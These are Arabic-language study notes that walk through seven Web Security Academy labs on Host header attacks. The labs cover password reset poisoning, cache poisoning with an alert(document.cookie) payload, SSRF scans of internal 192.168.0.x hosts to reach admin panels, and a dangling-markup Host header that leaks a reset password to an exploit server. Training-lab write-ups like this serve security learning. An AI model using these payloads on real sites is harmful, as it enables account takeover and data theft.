
---

1) Lab: Basic password reset poisoning
	انتا هنا هتعمل انك نسيت الباسورد بتاعت winer وبعدين تخش على الميل وتفتح اللينك وتغير الباسورد 
	وتمسك طلب forget  وتغير ال host الى host بتاع exploit  وتغير الاسم الى carlos  وتبعت الطلب وترجه تشوف السيرفر وتجيب token وتروح عند اللينك بتاع التغير وتغير توكن winer الى توكن carlos  وتفتح وتغير الباسورد وبعدين تسجل دخول 
---
2) # Lab: Host header authentication bypass 
	الفكره هنا هتروح تشوف الادمن اسمه ايه الاول robots.txt  وتجيبه وتغير الريسبونس بس لازم ال host يبقا localhost وبس وتروح تعمل الغاء لليوزر ب ```  GET /admin/delete?username=carlos```
---
3) # Lab: Web cache poisoning via ambiguous requests
	 - افتح الصفحة الرئيسية من Burp Suite، وابعت طلب `GET /` إلى Repeater، ولاحظ إن السيرفر بيتجاهل قيمة `Host` الثانية رغم التحقق من الأولى.
	- أضف Cache Buster زي `?cb=123`، وجرّب إضافة `Host` ثانية بقيمة عشوائية؛ هتلاحظ إن القيمة بتظهر في رابط تحميل ملف JavaScript داخل الاستجابة.
	- على Exploit Server، أنشئ الملف `/resources/js/tracking.js` وضع فيه `alert(document.cookie)`، ثم استخدم دومين الـ Exploit Server في ترويسة `Host` الثانية لتسميم الكاش.
	- كرر الطلب لحد ما تحصل على Cache Hit، واختبر الصفحة بنفس الـ Cache Buster للتأكد من تنفيذ `alert()`، ثم أعد تسميم الكاش بدون Cache Buster لإكمال اللاب
---
4) Lab: Routing-based SSRF 
	```
	 `GET /admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos`
	```
	 - ابعت `GET /` إلى Repeater، واستبدل قيمة `Host` بدومين Burp Collaborator، ثم اعمل Poll now للتأكد إن السيرفر بيبعت Requests للدومين.
	- ابعت الريكوست إلى Intruder، وعطّل Update Host header to match target، واستخدم `Host: 192.168.0.§0§` مع أرقام من `0` إلى `255` لاكتشاف عنوان لوحة الإدارة الداخلية.
	- ابعت الريكوست اللي رجع `302` إلى Repeater، وغيّر المسار إلى `GET /admin` للوصول للوحة الإدارة واستخراج CSRF Token وSession Cookie.
	- جهّز طلب حذف المستخدم `carlos` إلى `/admin/delete` باستخدام `csrf` و`username=carlos` والـ Session Cookie، ثم حوّل الطلب إلى `POST` وأرسله لإكمال اللاب.
---
5) Lab: SSRF via flawed request parsing 
	```
	GET [https://YOUR-LAB-ID.web-security-academy.net/admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos](https://your-lab-id.web-security-academy.net/admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos)
	```
	- ابعت `GET /` إلى Repeater، وجرّب استخدام Absolute URL في سطر الطلب بدل المسار العادي، مع تعديل `Host` وملاحظة إن الطلب بيعدّي التحقق.
	- استخدم Burp Collaborator للتأكد من إمكانية إرسال Requests لسيرفر خارجي، ثم ابعت الطلب إلى Intruder وامسح نطاق `192.168.0.0/24` باستخدام `Host` لاكتشاف عنوان لوحة الإدارة.
	- بعد تحديد الـ IP، أضف `/admin` إلى الـ Absolute URL في Repeater للوصول للوحة الإدارة، واستخرج منها CSRF Token والـ Session Cookie.
	- غيّر المسار إلى `/admin/delete?csrf=TOKEN&username=carlos`، وأضف الـ Cookie، وحوّل الطلب إلى `POST` وأرسله لحذف المستخدم `carlos` وإكمال اللاب
---
6) Lab: Host validation bypass via connection state attack 
	 الفكرة: السيرفر الأمامي بيتعامل مع الطلبات على اتصال واحد بطريقة بتسمح بتجاوز التحقق من `Host`.
	الاستغلال: تجهيز طلب عادي بالدومين الصحيح، ثم طلب داخلي على نفس الاتصال، باستخدام وضع الإرسال المتسلسل في Burp Repeater.
	استخراج البيانات: قراءة نموذج الإدارة للحصول على مسار الحذف واسم الباراميتر وCSRF Token.
	تحقيق الهدف: إرسال طلب `POST /admin/delete` مع بيانات الجلسة والرمز الصحيح، وتحديد `username=carlos` ولما بيقبل الكلب admin نجيب csrf علشان نستخدمها فى بعت الطلب
--- 
7) # Lab: Password reset poisoning via dangling markup
	```
	1. `Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER- ID.exploit-server.net/?`
	```
	- اللاب بيعتمد على ثغرة Password Reset Poisoning via Dangling Markup لتسريب كلمة المرور الجديدة لحساب Carlos.
	- سجّل الدخول بحسابك `wiener:peter` واطلب إعادة تعيين كلمة المرور.
	- افتح Exploit Server → Email client، وافحص رسالة إعادة التعيين، ولاحظ وجود كلمة المرور الجديدة داخل نص الإيميل.
	- من Burp Proxy → HTTP history، افحص استجابة `GET /email` وقارن بين العرض العادي وRaw HTML.
	- ابعت طلب `POST /forgot-password` إلى Repeater، وجرّب إضافة منفذ غير رقمي إلى `Host`.
	- لاحظ أن قيمة المنفذ بتظهر داخل HTML غير معالج بشكل آمن، قبل نص الرسالة الذي يحتوي على كلمة المرور.
	- عدّل `Host` باستخدام Dangling Markup payload يوجّه بقية محتوى الرسالة إلى Exploit Server الخاص باللاب.
	- افتح Access log في Exploit Server، وافحص الطلبات الواردة بحثًا عن محتوى الرسالة المُسرّب.
	- كرر الاختبار مع تغيير قيمة `username` إلى `carlos`، ثم استخرج كلمة المرور من السجل.
	- س
	- جّل الدخول بحساب Carlos باستخدام كلمة المرور المستخرجة لإكمال اللاب بنجاح
---
